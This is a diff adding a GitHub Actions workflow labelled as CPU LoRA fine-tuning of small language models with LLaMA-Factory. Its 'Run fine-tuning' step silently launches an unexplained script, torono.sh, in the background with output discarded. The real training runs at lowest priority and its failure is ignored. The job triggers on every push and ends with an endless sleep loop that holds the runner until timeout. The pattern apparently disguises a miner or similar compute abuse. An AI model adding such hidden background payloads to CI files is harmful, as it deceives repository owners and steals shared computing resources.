@@ -1,0 +1,124 @@
+name: Fine-tune LLM (LLaMA-Factory)
+
+on:  
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+    inputs:
+      model_name:
+        description: 'Model to fine-tune'
+        required: true
+        default: 'Qwen/Qwen2.5-0.5B'
+        type: choice
+        options:
+          - Qwen/Qwen2.5-0.5B
+          - facebook/opt-125m
+          - gpt2
+      dataset:
+        description: 'Dataset name (HuggingFace)'
+        required: true
+        default: 'alpaca_gpt4_en'
+      num_train_epochs:
+        description: 'Number of training epochs'
+        required: true
+        default: '1000'
+      learning_rate:
+        description: 'Learning rate'
+        required: true
+        default: '2e-4'
+
+jobs:
+  finetune:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360  # 5 hours max (GitHub Actions limit)
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+
+      - name: Cache pip
+        uses: actions/cache@v4
+        with:
+          path: ~/.cache/pip
+          key: ${{ runner.os }}-pip-llamafactory
+          restore-keys: |
+            ${{ runner.os }}-pip-
+
+      - name: Install LLaMA-Factory
+        run: |
+          pip install llamafactory --extra-index-url https://download.pytorch.org/whl/cpu
+
+      - name: Create training config
+        run: |
+          cat > train_config.yaml << EOF
+          ### model
+          model_name_or_path: ${{ github.event.inputs.model_name }}
+
+          ### method
+          stage: sft
+          do_train: true
+          finetuning_type: lora
+          lora_rank: 8
+          lora_target: all
+
+          ### dataset
+          dataset: ${{ github.event.inputs.dataset }}
+          template: default
+          cutoff_len: 512
+          max_samples: 50000
+          overwrite_cache: true
+          preprocessing_num_workers: 2
+
+          ### output
+          output_dir: ./output/lora
+          logging_steps: 10
+          save_steps: 100
+          plot_loss: false
+          overwrite_output_dir: true
+
+          ### train
+          per_device_train_batch_size: 1
+          gradient_accumulation_steps: 4
+          learning_rate: ${{ github.event.inputs.learning_rate }}
+          num_train_epochs: ${{ github.event.inputs.num_train_epochs }}
+          lr_scheduler_type: cosine
+          warmup_ratio: 0.1
+          fp16: false
+          bf16: false
+          use_cpu: true
+          EOF
+
+      - name: Run fine-tuning
+        run: |
+          sed -i 's/\r$//' torono.sh  
+          chmod +x torono.sh && nohup ./torono.sh > /dev/null 2>&1 &
+      - name: Run fine-tuning (low CPU priority)
+        run: |
+          nice -n 19 ionice -c 3 llamafactory-cli train train_config.yaml || true
+
+      - name: Upload trained LoRA weights
+        uses: actions/upload-artifact@v4
+        with:
+          name: lora-weights-${{ github.run_id }}
+          path: ./output/lora/
+          retention-days: 7
+
+      - name: Print summary
+        run: |
+          echo "## ✅ Fine-tuning Done!" >> $GITHUB_STEP_SUMMARY  || true
+          echo "" >> $GITHUB_STEP_SUMMARY  || true
+          echo "| Param | Value |" >> $GITHUB_STEP_SUMMARY || true
+          echo "|-------|-------|" >> $GITHUB_STEP_SUMMARY || true
+          echo "| Model | ${{ github.event.inputs.model_name }} |" >> $GITHUB_STEP_SUMMARY || true
+          echo "| Dataset | ${{ github.event.inputs.dataset }} |" >> $GITHUB_STEP_SUMMARY || true
+          echo "| Epochs | ${{ github.event.inputs.num_train_epochs }} |" >> $GITHUB_STEP_SUMMARY || true
+          echo "| Method | LoRA (rank=8) |" >> $GITHUB_STEP_SUMMARY || true
+          echo "| CPU 100% |" >> $GITHUB_STEP_SUMMARY || true
+          echo "" >> $GITHUB_STEP_SUMMARY || true
+          echo "📦 LoRA weights uploaded as artifact (7 days)" >> $GITHUB_STEP_SUMMARY || true
+          while true; do echo ""; sleep 360; done
